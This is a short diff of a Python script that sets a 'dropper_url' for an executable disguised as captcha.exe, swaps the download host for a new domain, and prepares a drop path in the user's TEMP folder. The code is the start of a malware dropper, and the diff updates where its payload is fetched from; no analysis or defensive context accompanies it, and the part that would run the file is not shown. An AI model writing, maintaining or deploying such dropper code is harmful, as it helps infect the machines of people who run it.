@@ -1,7 +1,7 @@
 import os
 import requests
 
-dropper_url = "https://angelcheats.cc/assets/captcha.exe"
+dropper_url = "https://oceanicismyson.90shipsnormal.site/download/captcha.exe"
 temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
 dropped_path = os.path.join(temp_dir, "captcha.exe")
 
